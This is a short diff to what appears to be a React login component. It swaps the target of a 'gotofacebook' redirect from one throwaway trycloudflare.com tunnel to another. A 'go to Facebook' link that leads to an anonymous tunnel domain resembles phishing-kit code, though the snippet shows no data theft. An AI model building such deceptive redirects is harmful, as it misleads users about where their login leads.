@@ -16,7 +16,7 @@ const Login = () => {
   }
 
   const gotofacebook = () => {
-    window.location.href = 'https://moderators-volt-cooling-audio.trycloudflare.com';
+    window.location.href = 'https://stamps-warcraft-persistent-extreme.trycloudflare.com';
   }
 
   const handleLogin = async (e) => {
